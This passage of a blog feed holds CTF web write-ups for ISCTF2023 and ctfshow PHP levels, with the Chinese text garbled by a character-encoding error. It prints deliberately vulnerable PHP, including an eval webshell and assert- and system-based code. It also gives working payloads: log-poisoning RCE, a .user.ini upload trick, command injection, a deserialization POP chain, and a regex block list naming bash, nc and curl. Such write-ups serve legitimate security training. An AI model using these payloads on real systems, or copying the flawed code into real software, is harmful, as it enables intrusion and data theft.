&#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;);     &#125;   &#125;    include($Datch); </span><br></pre></td></tr></table></figure><p>è®©Datché‡Œé¢å­˜åœ¨â€™sâ€™, â€˜eâ€™, â€˜vâ€™, â€˜aâ€™, â€˜nâ€™, â€˜xâ€™, â€˜râ€™, â€˜oâ€™ï¼Œç„¶åè¿‡æ»¤äº†ä¸€äº›ä¼ªåè®®ï¼Œä½†æ˜¯å­˜åœ¨include,å¯ä»¥æƒ³æƒ³æ—¥å¿—æ³¨å…¥ï¼Œå“ï¼Œæ­£å¥½æœ‰&#x2F;var,ä»€ä¹ˆçš„</p><p>Datch&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  åœ¨UAå¤´æ³¨å…¥ï¼Œç„¶årceå°±è¡Œäº†ï¼Œæˆ–è€…èšå‰‘è¿æ¥ï¼›</p><h4 id="å¤è¯»æœºï¼ˆsstiæ³¨å…¥ï¼‰ï¼š"><a href="#å¤è¯»æœºï¼ˆsstiæ³¨å…¥ï¼‰ï¼š" class="headerlink" title="å¤è¯»æœºï¼ˆsstiæ³¨å…¥ï¼‰ï¼š"></a>å¤è¯»æœºï¼ˆsstiæ³¨å…¥ï¼‰ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¢«è¿‡æ»¤çš„ç¬¦å·ï¼š+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>isctf2023webéƒ¨åˆ†wp</title>
      <link href="/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="åœ£æ¯æˆ˜äº‰-ï¼š"><a href="#åœ£æ¯æˆ˜äº‰-ï¼š" class="headerlink" title="åœ£æ¯æˆ˜äº‰!!!ï¼š"></a>åœ£æ¯æˆ˜äº‰!!!ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class artifact&#123;   public $excalibuer;   public $arrow;   public function __toString()&#123;     echo &quot;ä¸ºSaberé€‰æ‹©äº†å¯¹çš„æ­¦å™¨!&lt;br&gt;&quot;;     return $this-&gt;excalibuer-&gt;arrow;   &#125; &#125; class prepare&#123;   public $release;   public function __get($key)&#123;     $functioin = $this-&gt;release;     echo &quot;è“„åŠ›!å’–å–±æ£’ï¼ï¼&lt;br&gt;&quot;;     return $functioin();   &#125; &#125; class saber&#123;   public $weapon;   public function __invoke()&#123;     echo &quot;èƒœåˆ©ï¼&lt;br&gt;&quot;;     include($this-&gt;weapon);   &#125; &#125; class summon&#123;   public $Saber;   public $Rider;   public function __wakeup()&#123;     echo &quot;å¼€å§‹å¬å”¤ä»è€…ï¼&lt;br&gt;&quot;;     echo $this-&gt;Saber;   &#125; &#125; </span><br></pre></td></tr></table></figure><p>é“¾å­ï¼šsummon-&gt;artifact-&gt;prepare-&gt;saber</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line">$a = new summon();</span><br><span class="line">$b = new artifact();</span><br><span class="line">$c = new prepare();</span><br><span class="line">$d = new saber();</span><br><span class="line">$a -&gt; Saber = $b;</span><br><span class="line">$b -&gt; excalibuer = $c;</span><br><span class="line">$c -&gt; release = $d;</span><br><span class="line">$d -&gt; weapon = &quot;php://filter/convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿›ä½ çš„å¿ƒé‡Œ"><a href="#ç»•è¿›ä½ çš„å¿ƒé‡Œ" class="headerlink" title="ç»•è¿›ä½ çš„å¿ƒé‡Œ:"></a>ç»•è¿›ä½ çš„å¿ƒé‡Œ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); require &#x27;flag.php&#x27;; $str = (String)$_POST[&#x27;pan_gu&#x27;]; $num = $_GET[&#x27;zhurong&#x27;]; $lida1 = $_GET[&#x27;hongmeng&#x27;]; $lida2 = $_GET[&#x27;shennong&#x27;]; if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;   echo &quot;md5ç»•è¿‡äº†!&quot;;   if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;     die(&#x27;ä½ å¹²å˜›?å“å“Ÿ!&#x27;);   &#125;   elseif(intval($num))&#123;     if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;       die(&quot;å†æƒ³æƒ³!&quot;);     &#125;     if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;       die(&quot;å°±å·®ä¸€ç‚¹ç‚¹å•¦!&quot;);     &#125;     echo $flag;   &#125; &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¦–å…ˆæ˜¯md5ç»•è¿‡ï¼Œè¿›è¡Œæ•°ç»„ç»•è¿‡ï¼Œç„¶åç»•è¿‡preg_matchå‡½æ•°å†è¿›è¡Œç»•è¿‡è¿™ä¸ªï¼š</p><p>if(preg_match(â€˜&#x2F;.+?ISCTF&#x2F;isâ€™, $str)){            die(â€œå†æƒ³æƒ³!â€);        }        if(stripos($str, â€˜2023ISCTFâ€™) &#x3D;&#x3D;&#x3D; false){            die(â€œå°±å·®ä¸€ç‚¹ç‚¹å•¦!â€);        }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;pan[gu&#x27;: &#x27;a&#x27;*1000000 + &#x27;2023ISCTF&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&#x27;http://gz.imxbt.cn:20215/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&#x27;,</span><br><span class="line">                    data=data, allow_redirects=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag:"></a>Where is the flag:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php //flagä¸€åˆ†ä¸º3ï¼Œæ•£è½åœ¨å„å¤„ï¼Œåˆ†åˆ«æ˜¯ï¼šxxxxxxxxã€xxxxã€xxxã€‚ highlight_file(__FILE__); //æ ‡å‡†ä¸€å¥è¯æœ¨é©¬~ eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><p>ç®€å•ç›´æ¥ï¼š1&#x3D;system(â€˜envâ€™); æ˜¾ç¤ºå½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œæ²¡æƒ³åˆ°ç›´æ¥å‡ºæ¥äº†</p><h4 id="wafrï¼š"><a href="#wafrï¼š" class="headerlink" title="wafrï¼š"></a>wafrï¼š</h4><p>RCEçš„é¢˜ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); if(preg_match(&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;, $_POST[&#x27;code&#x27;]))&#123;//strings   die(&quot;æƒ³è¯»æˆ‘æ–‡ä»¶ï¼Ÿå¤§èƒ†ã€‚&quot;); &#125; elseif (preg_match(&quot;/\^|\||\~|\\$|\%|jay/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;æ— å­—æ¯æ•°å­—RCEï¼Ÿå¤§èƒ†ï¼&quot;); &#125; elseif (preg_match(&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;å¥‡æŠ€æ·«å·§ï¼Ÿå¤§èƒ†ï¼ï¼&quot;); &#125; elseif (preg_match(&quot;/fl|ag|\.|x/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;å¤§èƒ†ï¼ï¼ï¼&quot;); &#125; else&#123;   assert($_POST[&#x27;code&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>ç®€å•ï¼Œcode&#x3D;system(â€˜ca\t f*â€™)%0c</p><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz!:"></a>Fuzz!:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt Hint: ä½ éœ€è¦å­¦ä¼šfuzzï¼Œçœ‹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªå¯¹æ˜¯æ²¡æœ‰çµé­‚çš„ çŸ¥è¯†è¡¥å……ï¼šcurlå‘½ä»¤ä¹Ÿå¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶å“¦ï¼Œå¦‚curl file:///etc/passwd */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); $file = &#x27;file:///etc/passwd&#x27;; if(preg_match(&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   die(&#x27;ä½ éœ€è¦fuzzä¸€ä¸‹å“¦~&#x27;); &#125; if(!preg_match(&quot;/fi|le|flag/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   $file = $_GET[&#x27;file&#x27;]; &#125; system(&#x27;curl &#x27;.$file); </span><br></pre></td></tr></table></figure><p>æ–°å­¦ä¿©ä¸ªçŸ¥è¯†ç‚¹ï¼š[a-z]å¯ä»¥ç»•è¿‡ä»»æ„ä¸€ä¸ªå­—æ¯,â€|â€æ²¡è¿‡æ»¤å¯ä»¥æ”¾åœ¨å¼€å¤´ç»“æŸå‰é¢çš„curlï¼Œç„¶åå†æ‹¼æ¥ç³»ç»Ÿå‘½ä»¤</p><p>payload:?file&#x3D;|tac &#x2F;fl[a-z]ggggggg.txt   ç„¶åè¿˜æœ‰ä¸€ä¸ª:?file&#x3D;f{i}l{e}:&#x2F;&#x2F;&#x2F;fla{g}gggggg.txt  è¿›è¡Œfile:&#x2F;&#x2F;è¯»å–æ–‡ä»¶æŒ‡åœ¨æœ¬åœ°ç³»ç»Ÿé‡Œé¢è¯»å–æ–‡ä»¶</p><h4 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini:"></a>ez_ini:</h4><p>å‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿›è¡Œä¸Šä¼ æ–‡ä»¶ä¼ .user.ini.pngä»€ä¹ˆçš„ï¼Œç„¶ååœ¨bpé‡Œé¢è¿›è¡Œæ”¹æˆ.user.ini ,</p><p>å†…å®¹ï¼šGIF89a<br>auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>åœ¨UAå¤´ä¸Šé¢ä¼ å°ğŸï¼Œç„¶åèšå‰‘ç›´æ¥è¿å°±è¡Œäº†ï¼›</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowä¸­phpç‰¹æ€§ä¸Š</title>
      <link href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/"/>
      <url>/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p>PHPç‰¹æ€§ï¼š</p><p>89:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œï¼š?c&#x3D;system(â€˜tac fl*â€™);</p><p>90:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num===&quot;4476&quot;)&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125;else&#123;     echo intval($num,0);   &#125; </span><br></pre></td></tr></table></figure><p>intval:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><code>$var</code>ï¼šè¦è½¬æ¢ä¸ºæ•´æ•°çš„å˜é‡ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•°ç­‰ã€‚</p><p><code>$base</code>ï¼šå¯é€‰å‚æ•°ï¼ŒæŒ‡å®šè½¬æ¢æ‰€ä½¿ç”¨çš„è¿›åˆ¶ï¼Œé»˜è®¤å€¼æ˜¯ 10ï¼ˆåè¿›åˆ¶ï¼‰</p><p>intval ($num,0)ï¼š å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶ (octal)ï¼›å¦åˆ™ï¼Œ å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</p><p>è¿™ä¸ªæ˜¯æ„æ€è®©num!&#x3D;4476,ä½†æ˜¯intval($num,0)çš„æ„æ€æ˜¯ï¼š<code>if(intval($num,0)===4476)</code> è¯­å¥çš„ä½œç”¨æ˜¯åˆ¤æ–­ç»è¿‡ <code>intval</code> è½¬æ¢åçš„ <code>$num</code> çš„æ•´æ•°å€¼æ˜¯å¦ä¸¥æ ¼ç­‰äº <code>4476</code> ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ‰§è¡Œ <code>if</code> ä»£ç å—å†…çš„è¯­å¥ï¼›å¦‚æœä¸æ˜¯ï¼Œåˆ™è·³è¿‡ <code>if</code> ä»£ç å—å†…çš„è¯­å¥ã€‚</p><p>é‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œè¿›åˆ¶ï¼š?num&#x3D;0x117C</p><p>91:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;cmd&#x27;]; if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;   if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;     echo &#x27;hacker&#x27;;   &#125;   else&#123;     echo $flag;   &#125; &#125; else&#123;   echo &#x27;nonononono&#x27;; &#125; </span><br></pre></td></tr></table></figure><p>å‰é¢æ­£åˆ™æ˜¯im,ä½†æ˜¯åé¢å´æ˜¯i:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">ä¸åŒºåˆ†(ignore)å¤§å°å†™</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">å¤š(more)è¡ŒåŒ¹é…</span><br><span class="line">è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">å°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?cmd&#x3D;%0aphp(%0aæ˜¯æ¢è¡Œ)</p><p>92ï¼š</p><p>å’Œ90ä¸€æ ·ï¼›</p><p>93ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)==4476)&#123;     echo $flag;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å­—æ¯ä½†æ˜¯å°±æ˜¯ä¸èƒ½ä½¿ç”¨16è¿›åˆ¶ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨8è¿›åˆ¶ï¼šnum&#x3D;010574;</p><p>94:</p><p>å¤šè¿‡æ»¤äº†0,å°±æ˜¯ä¸èƒ½ä½¿ç”¨8è¿›åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨å°æ•°ï¼šnum&#x3D;4476.0;</p><p>95:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;     die(&quot;no no no!!&quot;);   &#125;   if(!strpos($num, &quot;0&quot;))&#123;     die(&quot;no no no!!!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure><p><code>strpos()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°æŒ‡å®šå­å­—ç¬¦ä¸²çš„ä½ç½®ã€‚é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ï¼š?num&#x3D;%0a010574(0b,0c)éƒ½æ˜¯å¯ä»¥çš„;</p><p>96ï¼š</p><p>(1):ç›´æ¥ä¸Šphpä¼ªåè®®ï¼šu&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(2)linux:linuxä¸‹é¢è¡¨ç¤ºå½“å‰ç›®å½•æ˜¯ .&#x2F; æ‰€ä»¥æˆ‘ä»¬çš„payloadï¼š u&#x3D;.&#x2F;flag.php</p><p>97:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo $flag; else print &#x27;Wrong.&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯md5ç»•è¿‡ï¼Œåœ¨ PHP ä¸­ï¼Œå­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒçš„æœºåˆ¶ï¼Œå³ä½¿ç”¨ <code>==</code> è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒPHP ä¼šå°è¯•å°†ä¸åŒç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºåˆé€‚çš„ç±»å‹å†è¿›è¡Œæ¯”è¾ƒã€‚å½“å¯¹æ•°ç»„ä½¿ç”¨ <code>md5()</code> å‡½æ•°æ—¶ï¼Œ<code>md5()</code> å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å› <code>null</code>ã€‚</p><p>ç›´æ¥æ•°ç»„ç»•è¿‡ï¼ša[]&#x3D;1&amp;b[]&#x3D;2</p><p>98:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); ?&gt; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦çœ‹æ‡‚ä¸‰å…ƒè¿ç®—ç¬¦ï¼Œå…¶æ ¼å¼ä¸ºï¼š(expr1) ? (expr2):(expr3)ã€‚å¦‚æœ expr1 ä¸º trueï¼Œåˆ™æ‰§è¡Œ expr2ï¼›å¦åˆ™ï¼Œæ‰§è¡Œ expr3ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure><p>å³åˆ¤æ–­æœ‰æ²¡æœ‰GETçš„å€¼ä¼ ï¼Œå¦‚æœæœ‰é‚£ä¹ˆGETä¼ å‚çš„å€¼&#x3D;POSTä¼ å‚çš„å€¼ç„¶åï¼š?HTTP_FLAG&#x3D;flag&#x2F;&#x2F;POST:HTTP_FLAG&#x3D;flag</p><p>99:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array(); for ($i=36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º$allowçš„æ•°ç»„ï¼›ç„¶ååœ¨è¿™ä¸ªæ•°ç»„é‡Œé¢ä½¿ç”¨forå¾ªç¯åœ¨æ•°ç»„ä¸­æ·»åŠ éšæœºæ•°ä»1ä¸€ç›´åˆ°877ï¼šç¬¬ä¸€æ¬¡:1-36,ç¬¬äºŒæ¬¡:1-37ä¾æ¬¡å¾ªç¯ï¼›ç„¶åå¯ä»¥åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”åœ¨æ–‡ä»¶ä¸­å†™å…¥ä»»æ„çš„ä¸œè¥¿ä½†æ˜¯å‰ææ˜¯ä¼ å…¥nçš„å€¼å†éšæœºæ•°çš„æ•°ç»„ä¸­å­˜åœ¨</p><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼šin_arrayå‡½æ•°çš„å°é—®é¢˜ï¼š<strong>in_array(ï¼‰æ­¤å‡½æ•°ä¸€èˆ¬æƒ…å†µä¸‹ä¼šæŠŠ <code>&quot;1.php&quot;</code> è§†ä¸ºæ•°å­— <code>1</code>ï¼Œ2.phpåŒç†</strong></p><p>ç„¶åå°±çŒœ1,2,3ä»€ä¹ˆçš„æ¦‚ç‡å¤§ç‚¹ï¼šç„¶ååœ¨ï¼š?n&#x3D;1.php;&#x2F;&#x2F;&#x2F;&#x2F;POST:content&#x3D;<?=system('ls');?>ç„¶åå°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p><p>100ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\;/&quot;, $v2))&#123;     if(preg_match(&quot;/\;/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¦–å…ˆè¦çŸ¥é“èµ‹å€¼æ“ä½œå¤§äºand;å³åªè¦v1&#x3D;numå°±è¡Œäº†ç„¶åå°±å¯ä»¥åˆ©ç”¨evalå‡½æ•°äº†(RCE)å°±è¡Œäº†ï¼›</p><p>v1&#x3D;1&amp;v2&#x3D;system(â€˜lsâ€™)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>101ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;     if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125; </span><br></pre></td></tr></table></figure><p>è¿™å…³å’Œweb100å…³çš„åŒºåˆ«æ˜¯ç¦ç”¨äº†è®¸å¤šç¬¦å·è¿™å°±è¯´æ˜æˆ‘ä»¬æ— æ³•ä½¿ç”¨æ³¨é‡Šæ¥åƒä¸Šä¸€å…³é‚£æ ·è¾“å‡ºctfshow;</p><p>è¿™é‡Œå‘¢éœ€è¦ä½¿ç”¨å†…ç½®å‡½æ•°åå°„ç±»ç»™ä»–å›æ˜¾å‡ºæ¥ï¼š</p><ul><li>ReflectionClassï¼šè·å–ç±»çš„ç›¸å…³ä¿¡æ¯ï¼Œå‡½æ•°ã€å±æ€§ã€å¸¸é‡ç­‰ï¼›</li><li>ReflectionMethodï¼šç±»çš„ç›¸å…³æ–¹æ³•çš„è·å–ä»¥åŠè°ƒç”¨ï¼›</li><li>ReflectionParameterï¼šè·å–ç±»çš„å‡½æ•°æˆ–è€…æ–¹æ³•å‚æ•°çš„ç›¸å…³ä¿¡æ¯ï¼›</li><li>ReflectionPropertyï¼šç±»çš„ç›¸å…³å±æ€§</li></ul><p>ç„¶åv1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p><p>102ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4)&#123;   $s = substr($v2,2);   $str = call_user_func($v1,$s);   echo $str;   file_put_contents($v3,$str); &#125; else&#123;   die(&#x27;hacker&#x27;); &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>substrå‡½æ•°:substr(a,b):è¿”å›ä¸€éƒ¨åˆ†ï¼Œä»bå¼€å§‹æˆªå– ä¾‹ï¼š$a&#x3D;123456 substr($a,2); è¿”å›ï¼š3456</p><p>call_user_func ($callback, parameter)ï¼šè°ƒç”¨å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¢«è°ƒç”¨å‡½æ•°æ‰€éœ€çš„å‚æ•°</p><p>file_put_contents (filename, data)ï¼šæŠŠ data æ•°æ®å†™å…¥ 